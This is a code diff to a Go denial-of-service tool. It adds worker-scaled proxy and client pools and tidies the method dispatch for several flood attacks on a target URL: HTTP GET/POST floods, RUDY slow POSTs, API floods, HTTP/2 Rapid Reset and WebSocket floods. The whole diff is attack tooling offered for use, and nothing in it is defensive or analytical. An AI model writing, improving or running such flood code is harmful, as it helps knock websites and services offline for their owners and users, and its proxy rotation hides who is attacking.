@@ -648,7 +648,7 @@ func loadProxies(filename string) ([]string, error) {
 	return lines, nil
 }
 
-func buildClientPool(proxies []string) ([]*http.Client, error) {
+func buildClientPool(proxies []string, workers int) ([]*http.Client, error) {
 	// Deduplicate — rotating proxies often use one gateway URL
 	seen := make(map[string]bool)
 	var unique []string
@@ -659,9 +659,15 @@ func buildClientPool(proxies []string) ([]*http.Client, error) {
 		}
 	}
 
-	// For each unique proxy, build a small cluster of clients so workers
-	// spread across independent transport connection pools.
-	const clientsPerProxy = 32
+	// Scale clients per proxy based on worker count so the ratio stays balanced.
+	// At least 1 client per proxy, at most 64.
+	clientsPerProxy := workers / len(unique)
+	if clientsPerProxy < 1 {
+		clientsPerProxy = 1
+	}
+	if clientsPerProxy > 64 {
+		clientsPerProxy = 64
+	}
 	clients := make([]*http.Client, 0, len(unique)*clientsPerProxy)
 
 	for _, raw := range unique {
@@ -1311,15 +1317,14 @@ func httpAPIFlood(targetURL string, client *http.Client) error {
 	return nil
 }
 
-func Worker(targetURL string, method string, clients []*http.Client, stop <-chan struct{}) {
+func Worker(id int, targetURL string, method string, clients []*http.Client, stop <-chan struct{}) {
+	client := clients[id%len(clients)]
 	for {
 		select {
 		case <-stop:
 			return
 		default:
 		}
-
-		client := clients[rand.Intn(len(clients))]
 
 		var err error
 		switch strings.ToLower(method) {
@@ -1332,7 +1337,7 @@ func Worker(targetURL string, method string, clients []*http.Client, stop <-chan
 			err = httpRudy(targetURL, client, stop)
 		case "apiflood":
 			err = httpAPIFlood(targetURL, client)
-		case "rapidreset", "rapidreset":
+		case "rapidreset":
 			// Raw HTTP/2 — bypasses http.Client entirely
 			err = httpRapidReset(targetURL, stop)
 		case "wsflood":
@@ -1387,7 +1392,7 @@ func main() {
 	// Validate method before doing anything
 	validMethods := map[string]bool{
 		"httpget": true, "httppost": true, "rudy": true,
-		"apiflood": true, "rapidreset": true, "rapidreset": true, "wsflood": true,
+		"apiflood": true, "rapidreset": true, "wsflood": true,
 	}
 	if !validMethods[strings.ToLower(*method)] {
 		fmt.Fprintf(os.Stderr, "\n  \033[31m✗\033[0m Unknown method: %s\n", *method)
@@ -1443,23 +1448,30 @@ func main() {
 	frames := []string{"⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"}
 	spinIdx := 0
 
+	// Methods that do raw TCP/TLS dialing and don't use http.Client pool
+	needsClientPool := true
+	switch strings.ToLower(*method) {
+	case "rapidreset", "wsflood":
+		needsClientPool = false
+	}
+
 	var clients []*http.Client
 
 	if proxyFile != "" {
-		// Proxied mode
-		done := make(chan int)
+		// Proxied mode — load proxies once
+		done := make(chan []string)
 		go func() {
 			proxies, err := loadProxies(proxyFile)
 			if err != nil {
 				log.Fatalf(red + "  ✗ " + reset + "failed to load proxies: " + err.Error())
 			}
-			done <- len(proxies)
+			done <- proxies
 		}()
-		var proxyCount int
+		var proxies []string
 	spinLoop:
 		for {
 			select {
-			case proxyCount = <-done:
+			case proxies = <-done:
 				break spinLoop
 			default:
 				fmt.Printf("\r  %s%s%s Loading proxies...  ", yellow, frames[spinIdx%len(frames)], reset)
@@ -1467,39 +1479,51 @@ func main() {
 				time.Sleep(80 * time.Millisecond)
 			}
 		}
-		proxies, _ := loadProxies(proxyFile)
 		proxyList = proxies
-		fmt.Printf("\r  %s✓%s Loaded %s%d%s proxies                \n", green, reset, bold, proxyCount, reset)
+		fmt.Printf("\r  %s✓%s Loaded %s%d%s proxies                \n", green, reset, bold, len(proxies), reset)
 
-		done2 := make(chan int)
-		go func() {
-			c, err := buildClientPool(proxies)
-			if err != nil {
-				log.Fatalf(red + "  ✗ " + reset + "failed to build client pool: " + err.Error())
+		if needsClientPool {
+			done2 := make(chan []*http.Client)
+			go func() {
+				c, err := buildClientPool(proxies, workers)
+				if err != nil {
+					log.Fatalf(red + "  ✗ " + reset + "failed to build client pool: " + err.Error())
+				}
+				done2 <- c
+			}()
+			spinIdx = 0
+		spinLoop2:
+			for {
+				select {
+				case clients = <-done2:
+					break spinLoop2
+				default:
+					fmt.Printf("\r  %s%s%s Building client pool...  ", yellow, frames[spinIdx%len(frames)], reset)
+					spinIdx++
+					time.Sleep(80 * time.Millisecond)
+				}
 			}
-			done2 <- len(c)
-		}()
-		spinIdx = 0
-		var clientCount int
-	spinLoop2:
-		for {
-			select {
-			case clientCount = <-done2:
-				break spinLoop2
-			default:
-				fmt.Printf("\r  %s%s%s Building client pool...  ", yellow, frames[spinIdx%len(frames)], reset)
-				spinIdx++
-				time.Sleep(80 * time.Millisecond)
-			}
+			fmt.Printf("\r  %s✓%s Built %s%d%s proxy clients            \n", green, reset, bold, len(clients), reset)
+		} else {
+			fmt.Printf("  %s✓%s Skipped client pool (%s uses raw connections)\n", green, reset, strings.ToUpper(*method))
 		}
-		clients, _ = buildClientPool(proxies)
-		fmt.Printf("\r  %s✓%s Built %s%d%s proxy clients            \n", green, reset, bold, clientCount, reset)
 	} else {
-		// Direct mode — no proxies
-		poolSize := 32
-		fmt.Printf("\r  %s✓%s Direct mode (no proxies)\n", green, reset)
-		clients = buildDirectPool(poolSize)
-		fmt.Printf("  %s✓%s Built %s%d%s direct clients            \n", green, reset, bold, poolSize, reset)
+		// Direct mode — scale pool with worker count
+		if needsClientPool {
+			poolSize := workers / 8
+			if poolSize < 4 {
+				poolSize = 4
+			}
+			if poolSize > 256 {
+				poolSize = 256
+			}
+			fmt.Printf("\r  %s✓%s Direct mode (no proxies)\n", green, reset)
+			clients = buildDirectPool(poolSize)
+			fmt.Printf("  %s✓%s Built %s%d%s direct clients            \n", green, reset, bold, poolSize, reset)
+		} else {
+			fmt.Printf("\r  %s✓%s Direct mode (no proxies)\n", green, reset)
+			fmt.Printf("  %s✓%s Skipped client pool (%s uses raw connections)\n", green, reset, strings.ToUpper(*method))
+		}
 	}
 	fmt.Println()
 
@@ -1512,8 +1536,14 @@ func main() {
 
 	stop := make(chan struct{})
 
+	// For methods that skip the client pool, provide a single dummy client
+	// so Worker doesn't index into a nil slice.
+	if clients == nil {
+		clients = []*http.Client{{}}
+	}
+
 	for i := 0; i < workers; i++ {
-		go Worker(targetURL, *method, clients, stop)
+		go Worker(i, targetURL, *method, clients, stop)
 	}
 
 	fmt.Printf("  %s%s▸%s %s%d%s workers launched → %s%s%s for %s%ds%s\n\n",
